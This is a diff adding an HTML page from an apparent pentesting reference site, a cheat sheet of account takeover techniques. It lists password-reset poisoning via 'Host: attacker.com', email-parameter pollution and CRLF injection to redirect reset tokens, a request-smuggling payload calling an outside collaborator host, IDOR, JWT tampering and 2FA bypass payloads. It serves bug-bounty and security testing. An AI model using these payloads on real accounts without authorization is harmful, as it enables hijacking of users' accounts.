@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="All about account take over techniques, methods, payloads, how/why/when they work.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Account Takeovers" />
+<meta property="og:description" content="All about account take over techniques, methods, payloads, how/why/when they work." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/checking_for_account_takeover/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>Account Takeovers | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.d50fea2a76ff11c274e36eee7c462453fa589bda1ed7236d45eaf1c9b25c1336.js" integrity="sha256-1Q/qKnb/EcJ0427ufEYkU/pYm9oe1yNtRerxybJcEzY=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="active">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Account Takeovers</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#account-takeover">Account Takeover</a>
+      <ul>
+        <li><a href="#password-reset-feature">Password Reset Feature</a>
+          <ul>
+            <li><a href="#password-reset-token-leak-via-referrer">Password Reset Token Leak Via Referrer</a></li>
+            <li><a href="#account-takeover-through-password-reset-poisoning">Account Takeover Through Password Reset Poisoning</a></li>
+            <li><a href="#password-reset-via-email-parameter">Password Reset Via Email Parameter</a></li>
+            <li><a href="#idor-on-api-parameters">IDOR on API Parameters</a></li>
+            <li><a href="#weak-password-reset-token">Weak Password Reset Token</a></li>
+            <li><a href="#leaking-password-reset-token">Leaking Password Reset Token</a></li>
+            <li><a href="#password-reset-via-username-collision">Password Reset Via Username Collision</a></li>
+            <li><a href="#account-takeover-due-to-unicode-normalization-issue">Account takeover due to unicode normalization issue</a></li>
+          </ul>
+        </li>
+        <li><a href="#account-takeover-via-cross-site-scripting">Account Takeover Via Cross Site Scripting</a></li>
+        <li><a href="#account-takeover-via-http-request-smuggling">Account Takeover Via HTTP Request Smuggling</a></li>
+        <li><a href="#account-takeover-via-csrf">Account Takeover via CSRF</a></li>
+        <li><a href="#account-takeover-via-jwt">Account Takeover via JWT</a></li>
+        <li><a href="#2fa-bypasses">2FA Bypasses</a>
+          <ul>
+            <li><a href="#response-manipulation">Response Manipulation</a></li>
+            <li><a href="#status-code-manipulation">Status Code Manipulation</a></li>
+            <li><a href="#2fa-code-leakage-in-response">2FA Code Leakage in Response</a></li>
+            <li><a href="#js-file-analysis">JS File Analysis</a></li>
+            <li><a href="#2fa-code-reusability">2FA Code Reusability</a></li>
+            <li><a href="#lack-of-brute-force-protection">Lack of Brute-Force Protection</a></li>
+            <li><a href="#missing-2fa-code-integrity-validation">Missing 2FA Code Integrity Validation</a></li>
+            <li><a href="#csrf-on-2fa-disabling">CSRF on 2FA Disabling</a></li>
+            <li><a href="#password-reset-disable-2fa">Password Reset Disable 2FA</a></li>
+            <li><a href="#backup-code-abuse">Backup Code Abuse</a></li>
+            <li><a href="#clickjacking-on-2fa-disabling-page">Clickjacking on 2FA Disabling Page</a></li>
+            <li><a href="#enabling-2fa-doesnt-expire-previously-active-sessions">Enabling 2FA doesn&rsquo;t expire Previously active Sessions</a></li>
+            <li><a href="#bypass-2fa-with-null-or-000000">Bypass 2FA with null or 000000</a></li>
+            <li><a href="#bypass-2fa-with-array">Bypass 2FA with array</a></li>
+          </ul>
+        </li>
+        <li><a href="#todo">TODO</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="account-takeover">
+  Account Takeover
+  <a class="anchor" href="#account-takeover">#</a>
+</h1>
+<h2 id="password-reset-feature">
+  Password Reset Feature
+  <a class="anchor" href="#password-reset-feature">#</a>
+</h2>
+<h3 id="password-reset-token-leak-via-referrer">
+  Password Reset Token Leak Via Referrer
+  <a class="anchor" href="#password-reset-token-leak-via-referrer">#</a>
+</h3>
+<ol>
+<li>Request password reset to your email address</li>
+<li>Click on the password reset link</li>
+<li>Don&rsquo;t change password</li>
+<li>Click any 3rd party websites(eg: Facebook, twitter)</li>
+<li>Intercept the request in Burp Suite proxy</li>
+<li>Check if the referer header is leaking password reset token.</li>
+</ol>
+<h3 id="account-takeover-through-password-reset-poisoning">
+  Account Takeover Through Password Reset Poisoning
+  <a class="anchor" href="#account-takeover-through-password-reset-poisoning">#</a>
+</h3>
+<ol>
+<li>Intercept the password reset request in Burp Suite</li>
+<li>Add or edit the following headers in Burp Suite : <code>Host: attacker.com</code>, <code>X-Forwarded-Host: attacker.com</code></li>
+<li>Forward the request with the modified header
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> https://example.com/reset.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">attacker.com</span>
+</span></span></code></pre></div></li>
+<li>Look for a password reset URL based on the <em>host header</em> like : <code>https://attacker.com/reset-password.php?token=TOKEN</code></li>
+</ol>
+<h3 id="password-reset-via-email-parameter">
+  Password Reset Via Email Parameter
+  <a class="anchor" href="#password-reset-via-email-parameter">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># parameter pollution</span>
+</span></span><span style="display:flex;"><span>email=victim@mail.com&amp;email=hacker@mail.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># array of emails</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;email&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#e6db74">&#34;victim@mail.com&#34;</span>,<span style="color:#e6db74">&#34;hacker@mail.com&#34;</span>]}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># carbon copy</span>
+</span></span><span style="display:flex;"><span>email=victim@mail.com<span style="color:#66d9ef">%</span>0A<span style="color:#66d9ef">%</span>0Dcc<span style="color:#960050;background-color:#1e0010">:</span>hacker@mail.com
+</span></span><span style="display:flex;"><span>email=victim@mail.com<span style="color:#66d9ef">%</span>0A<span style="color:#66d9ef">%</span>0Dbcc<span style="color:#960050;background-color:#1e0010">:</span>hacker@mail.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># separator</span>
+</span></span><span style="display:flex;"><span>email=victim@mail.com,hacker@mail.com
+</span></span><span style="display:flex;"><span>email=victim@mail.com<span style="color:#66d9ef">%</span>20hacker@mail.com
+</span></span><span style="display:flex;"><span>email=victim@mail.com|hacker@mail.com
+</span></span></code></pre></div><h3 id="idor-on-api-parameters">
+  IDOR on API Parameters
+  <a class="anchor" href="#idor-on-api-parameters">#</a>
+</h3>
+<ol>
+<li>Attacker have to login with their account and go to the <strong>Change password</strong> feature.</li>
+<li>Start the Burp Suite and Intercept the request</li>
+<li>Send it to the repeater tab and edit the parameters : User ID/email
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>POST /api/changepass
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>(<span style="color:#e6db74">&#34;form&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {<span style="color:#e6db74">&#34;email&#34;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;victim@email.com&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;securepwd&#34;</span>})
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="weak-password-reset-token">
+  Weak Password Reset Token
+  <a class="anchor" href="#weak-password-reset-token">#</a>
+</h3>
+<p>The password reset token should be randomly generated and unique every time.
+Try to determine if the token expire or if it&rsquo;s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.</p>
+<ul>
+<li>Timestamp</li>
+<li>UserID</li>
+<li>Email of User</li>
+<li>Firstname and Lastname</li>
+<li>Date of Birth</li>
+<li>Cryptography</li>
+<li>Number only</li>
+<li>Small token sequence (&lt;6 characters between [A-Z,a-z,0-9])</li>
+<li>Token reuse</li>
+<li>Token expiration date</li>
+</ul>
+<h3 id="leaking-password-reset-token">
+  Leaking Password Reset Token
+  <a class="anchor" href="#leaking-password-reset-token">#</a>
+</h3>
+<ol>
+<li>Trigger a password reset request using the API/UI for a specific email e.g: 
+  <a href="mailto:test@mail.com">test@mail.com</a></li>
+<li>Inspect the server response and check for <code>resetToken</code></li>
+<li>Then use the token in an URL like <code>https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&amp;email=[THE_MAIL]</code></li>
+</ol>
+<h3 id="password-reset-via-username-collision">
+  Password Reset Via Username Collision
+  <a class="anchor" href="#password-reset-via-username-collision">#</a>
+</h3>
+<ol>
+<li>Register on the system with a username identical to the victim&rsquo;s username, but with white spaces inserted before and/or after the username. e.g: <code>&quot;admin &quot;</code></li>
+<li>Request a password reset with your malicious username.</li>
+<li>Use the token sent to your email and reset the victim password.</li>
+<li>Connect to the victim account with the new password.</li>
+</ol>
+<p>The platform CTFd was vulnerable to this attack.
+See: 
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7245">CVE-2020-7245</a></p>
+<h3 id="account-takeover-due-to-unicode-normalization-issue">
+  Account takeover due to unicode normalization issue
+  <a class="anchor" href="#account-takeover-due-to-unicode-normalization-issue">#</a>
+</h3>
+<ul>
+<li>Victim account: <code>demo@gmail.com</code></li>
+<li>Attacker account: <code>demⓞ@gmail.com</code></li>
+</ul>
+<h2 id="account-takeover-via-cross-site-scripting">
+  Account Takeover Via Cross Site Scripting
+  <a class="anchor" href="#account-takeover-via-cross-site-scripting">#</a>
+</h2>
+<ol>
+<li>Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : <code>*.domain.com</code></li>
+<li>Leak the current <strong>sessions cookie</strong></li>
+<li>Authenticate as the user using the cookie</li>
+</ol>
+<h2 id="account-takeover-via-http-request-smuggling">
+  Account Takeover Via HTTP Request Smuggling
+  <a class="anchor" href="#account-takeover-via-http-request-smuggling">#</a>
+</h2>
+<p>Refer to <strong>HTTP Request Smuggling</strong> vulnerability page.</p>
+<ol>
+<li>Use <strong>smuggler</strong> to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/defparam/smuggler.git
+</span></span><span style="display:flex;"><span>cd smuggler
+</span></span><span style="display:flex;"><span>python3 smuggler.py -h
+</span></span></code></pre></div></li>
+<li>Craft a request which will overwrite the <code>POST / HTTP/1.1</code> with the following data:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>GET http<span style="color:#960050;background-color:#1e0010">:</span>//something.burpcollaborator.net  HTTP/<span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>X: 
+</span></span></code></pre></div></li>
+<li>Final request could look like the following
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>GET /  HTTP/<span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Transfer-Encoding<span style="color:#960050;background-color:#1e0010">:</span> chunked
+</span></span><span style="display:flex;"><span>Host<span style="color:#960050;background-color:#1e0010">:</span> something.com
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#960050;background-color:#1e0010">:</span> Smuggler/v1.0
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">83</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GET http<span style="color:#960050;background-color:#1e0010">:</span>//something.burpcollaborator.net  HTTP/<span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>X: X
+</span></span></code></pre></div></li>
+</ol>
+<p>Hackerone reports exploiting this bug</p>
+<ul>
+<li>
+  <a href="https://hackerone.com/reports/737140">https://hackerone.com/reports/737140</a></li>
+<li>
+  <a href="https://hackerone.com/reports/771666">https://hackerone.com/reports/771666</a></li>
+</ul>
+<h2 id="account-takeover-via-csrf">
+  Account Takeover via CSRF
+  <a class="anchor" href="#account-takeover-via-csrf">#</a>
+</h2>
+<ol>
+<li>Create a payload for the CSRF, e.g: &ldquo;HTML form with auto submit for a password change&rdquo;</li>
+<li>Send the payload</li>
+</ol>
+<h2 id="account-takeover-via-jwt">
+  Account Takeover via JWT
+  <a class="anchor" href="#account-takeover-via-jwt">#</a>
+</h2>
+<p>JSON Web Token might be used to authenticate an user.</p>
+<ul>
+<li>Edit the JWT with another User ID / Email</li>
+<li>Check for weak JWT signature</li>
+</ul>
+<h2 id="2fa-bypasses">
+  2FA Bypasses
+  <a class="anchor" href="#2fa-bypasses">#</a>
+</h2>
+<h3 id="response-manipulation">
+  Response Manipulation
+  <a class="anchor" href="#response-manipulation">#</a>
+</h3>
+<p>In response if <code>&quot;success&quot;:false</code>
+Change it to <code>&quot;success&quot;:true</code></p>
+<h3 id="status-code-manipulation">
+  Status Code Manipulation
+  <a class="anchor" href="#status-code-manipulation">#</a>
+</h3>
+<p>If Status Code is <strong>4xx</strong>
+Try to change it to <strong>200 OK</strong> and see if it bypass restrictions</p>
+<h3 id="2fa-code-leakage-in-response">
+  2FA Code Leakage in Response
+  <a class="anchor" href="#2fa-code-leakage-in-response">#</a>
+</h3>
+<p>Check the response of the 2FA Code Triggering Request to see if the code is leaked.</p>
+<h3 id="js-file-analysis">
+  JS File Analysis
+  <a class="anchor" href="#js-file-analysis">#</a>
+</h3>
+<p>Rare but some JS Files may contain info about the 2FA Code, worth giving a shot</p>
+<h3 id="2fa-code-reusability">
+  2FA Code Reusability
+  <a class="anchor" href="#2fa-code-reusability">#</a>
+</h3>
+<p>Same code can be reused</p>
+<h3 id="lack-of-brute-force-protection">
+  Lack of Brute-Force Protection
+  <a class="anchor" href="#lack-of-brute-force-protection">#</a>
+</h3>
+<p>Possible to brute-force any length 2FA Code</p>
+<h3 id="missing-2fa-code-integrity-validation">
+  Missing 2FA Code Integrity Validation
+  <a class="anchor" href="#missing-2fa-code-integrity-validation">#</a>
+</h3>
+<p>Code for any user acc can be used to bypass the 2FA</p>
+<h3 id="csrf-on-2fa-disabling">
+  CSRF on 2FA Disabling
+  <a class="anchor" href="#csrf-on-2fa-disabling">#</a>
+</h3>
+<p>No CSRF Protection on disabling 2FA, also there is no auth confirmation</p>
+<h3 id="password-reset-disable-2fa">
+  Password Reset Disable 2FA
+  <a class="anchor" href="#password-reset-disable-2fa">#</a>
+</h3>
+<p>2FA gets disabled on password change/email change</p>
+<h3 id="backup-code-abuse">
+  Backup Code Abuse
+  <a class="anchor" href="#backup-code-abuse">#</a>
+</h3>
+<p>Bypassing 2FA by abusing the Backup code feature
+Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions</p>
+<h3 id="clickjacking-on-2fa-disabling-page">
+  Clickjacking on 2FA Disabling Page
+  <a class="anchor" href="#clickjacking-on-2fa-disabling-page">#</a>
+</h3>
+<p>Iframing the 2FA Disabling page and social engineering victim to disable the 2FA</p>
+<h3 id="enabling-2fa-doesnt-expire-previously-active-sessions">
+  Enabling 2FA doesn&rsquo;t expire Previously active Sessions
+  <a class="anchor" href="#enabling-2fa-doesnt-expire-previously-active-sessions">#</a>
+</h3>
+<p>If the session is already hijacked and there is a session timeout vuln</p>
+<h3 id="bypass-2fa-with-null-or-000000">
+  Bypass 2FA with null or 000000
+  <a class="anchor" href="#bypass-2fa-with-null-or-000000">#</a>
+</h3>
+<p>Enter the code <strong>000000</strong> or <strong>null</strong> to bypass 2FA protection.</p>
+<h3 id="bypass-2fa-with-array">
+  Bypass 2FA with array
+  <a class="anchor" href="#bypass-2fa-with-array">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;otp&#34;</span>:[
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1234&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1111&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1337&#34;</span>, <span style="color:#75715e">// GOOD OTP
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;2222&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;3333&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;4444&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;5555&#34;</span>
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="todo">
+  TODO
+  <a class="anchor" href="#todo">#</a>
+</h2>
+<ul>
+<li>Broken cryptography</li>
+<li>Session hijacking</li>
+<li>OAuth misconfiguration</li>
+</ul>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="http://anugrahsr.me/posts/10-Password-reset-flaws/">10 Password Reset Flaws - Anugrah SR</a></li>
+<li>
+  <a href="https://www.youtube.com/watch?v=gzM4wWA7RFo&amp;feature=youtu.be">$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained</a></li>
+<li>
+  <a href="https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28">Broken Cryptography &amp; Account Takeovers - Harsh Bothra - September 20, 2020</a></li>
+<li>
+  <a href="https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/">Hacking Grindr Accounts with Copy and Paste - Troy HUNT &amp; Wassime BOUIMADAGHENE - 03 OCTOBER 2020</a></li>
+<li>
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7245">CTFd Account Takeover</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/checking_for_account_takeover.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
